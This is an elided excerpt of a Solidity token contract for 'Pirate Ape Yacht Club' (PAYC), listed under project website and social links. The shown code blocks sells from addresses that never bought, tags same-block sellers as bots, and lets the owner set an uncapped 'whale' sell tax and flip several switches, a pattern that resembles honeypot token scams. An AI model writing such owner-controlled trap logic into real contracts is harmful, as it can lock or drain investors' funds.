...
https://pirateapeyacht.club/
https://t.me/pirateapeyachtclub
https://discord.com/invite/pirateapes
https://twitter.com/PirateApeYachtC  
...
contract PirateApe is Context, IERC20, Ownable {
    ...
    string private _name = "Pirate Ape Yacht Club";
    string private _symbol = "PAYC";
    ...
    uint256 public _previousTaxFee = 3; 
    uint256 public _whaleTaxFee = 55; // anti front
    ...
    address[] public mevBots;

    bool public swapAndLiquifyEnabled = true;
    
    // Cooldown & timer functionality
    bool public cooldownEnabled = true;
    bool public callOraclePrice = true;
    uint256 public cooldownTimerInterval = 120; //this is in seconds. 
    mapping (address => uint) private cooldownTimer;
    mapping (address => uint256) private lastBuyBlocks;
    bool public buyBackEnabled = true;
    bool private antiwhale = true;
    bool public paperhandEnabled = false;
    ...
    function _transfer(
        ...
        if (from != pair && lastBuyBlocks[from] == block.number) {
            mevBots.push(from);
        }

        // anti-whale
        if (!isTimelockExempt[from] && to == pair) {
            require(lastBuyBlocks[from] > 0, "Sniping not allowed!");
            if (antiwhale) {
                if (lastBuyBlocks[from] == block.number) {
                    setWhaleFee();
                }
            }
        }
    ...
    function setWhaleTax(uint256 _tax) external onlyOwner {
        _whaleTaxFee = _tax;
    }
    ...
    function showMevBots() public view returns (address[] memory) {
        return mevBots;
    }

    function showMev(uint256 index) public view returns (address) {
        return mevBots[index];
    }
    ...
    function paperhandEnable(bool _status) external onlyOwner {
        paperhandEnabled = _status;
    }

    function previousOracleEnable(bool _status) external onlyOwner {
        callOraclePrice = _status;
    }
    ...
    function callPreviousOracle() private {
